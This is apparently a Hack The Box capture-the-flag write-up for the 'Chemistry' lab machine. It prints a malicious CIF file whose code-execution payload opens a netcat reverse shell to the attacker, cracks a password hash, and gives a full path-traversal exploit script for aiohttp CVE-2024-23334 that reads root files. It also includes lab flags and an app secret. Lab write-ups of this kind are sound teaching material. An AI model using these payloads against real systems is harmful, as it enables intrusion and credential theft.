---
# Chemistry - Easy - Linux

---
---

```
┌────────────────────────────────────────────┐
| Target Name       : Chemistry 
| Target OS         : Linux
| Target IP         : 10.10.11.38
| Points            : 20
| Difficulty        : Easy
| User Flag         : false
| Root Flag         : false
|────────────────────────────────────────────|
| Attacker          : dawnl3ss
| Attacker IP       : 10.10.14.8
└────────────────────────────────────────────┘
```

I obviously started by doing an NMAP scan of the target machine

```
┌──(dawnl3ss㉿kali)-[~/Neptune/CTF/HTB/Chemistry]
└─$ nmap -sC -sV -p- -Pn chemistry.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-06 18:57 EST
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 06 Jan 2025 23:57:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
...SNIP...
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-serviceo: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.21 seconds
```

First thing first, we will explore the website running on port 5000. We can see a login panel 

After doing few researches, I come with an interesting github issue :
https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
<img>

I use this vuln CIF file :


```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc 10.10.14.8 4444 -e /bin/bash");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

```sh
┌──(dawnl3ss㉿kali)-[~/Neptune/CTF/HTB/Chemistry]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.38] 49914
python3 -c 'import pty; pty.spawn("/bin/bash")'
app@chemistry:~$ 
```

Then, after searching a little bit the folders, I found these credentials. We can use them to get access to the SQLite database.

```
hgapp = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
```

```
┌──(dawnl3ss㉿kali)-[~/Neptune/CTF/HTB/Chemistry]
└─$ ls
database.db  tojohn  vulned.cif
                                                                      
┌──(dawnl3ss㉿kali)-[~/Neptune/CTF/HTB/Chemistry]
└─$ locate rockyou.txt          
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/rockyou.txt.gz
                                                                      
┌──(dawnl3ss㉿kali)-[~/Neptune/CTF/HTB/Chemistry]
└─$ john --format=raw-md5 tojohn --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorniosrosados (?)     
1g 0:00:00:00 DONE (2025-03-23 00:42) 6.250g/s 18636Kp/s 18636Kc/s 18636KC/s unihmaryanih..unicornios2805
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```


```sh
┌──(dawnl3ss㉿kali)-[~/Neptune/CTF/HTB/Chemistry]
└─$ ssh rosa@chemistry.htb 
The authenticity of host 'chemistry.htb (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'chemistry.htb' (ED25519) to the list of known hosts.
rosa@chemistry.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 23 Mar 2025 07:43:40 AM UTC

  System load:           0.0
  Usage of /:            82.3% of 5.08GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             247
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb0:43a6


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

rosa@chemistry:~$ ls
linpeas.sh  user.txt

rosa@chemistry:~$ cat user.txt
3b77b5458ae2f8ddb4db66832f791024
```


The targetted machine seems to have a local app running under the port 8080.
Let's do a quick local port forwarding to check whats going on on it :

```sh
ssh -N -R 127.0.0.1:1337:chemistry.htb:8080 rosa@chemistry.htb
```

Then I ran an NMAP scan to discover more about this app :

```sh
┌──(dawnl3ss㉿kali)-[~]
└─$ nmap 127.0.0.1 -p 1337 -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-23 01:11 PDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000042s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    aiohttp 3.9.1 (Python 3.9)
|_http-server-header: Python/3.9 aiohttp/3.9.1
|_http-title: Site Monitoring

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
```

Alright, we can see here that the app is running under AioHTTP version 3.9.1. Let's check if there is any vulnerability on this particular version.

After quick researches, I came up with this github repo : https://github.com/z3rObyte/CVE-2024-23334-PoC

After changing the exploit, I ran it :

```sh
┌──(dawnl3ss㉿kali)-[~/…/CTF/HTB/Chemistry/CVE-2024-23334-PoC]
└─$ cat exploit.sh 
#!/bin/bash

url="http://127.0.0.1:1337"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```


```sh
┌──(dawnl3ss㉿kali)-[~/…/CTF/HTB/Chemistry/CVE-2024-23334-PoC]
└─$ bash exploit.sh
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
89772189b971ff033773c375937875a6
```


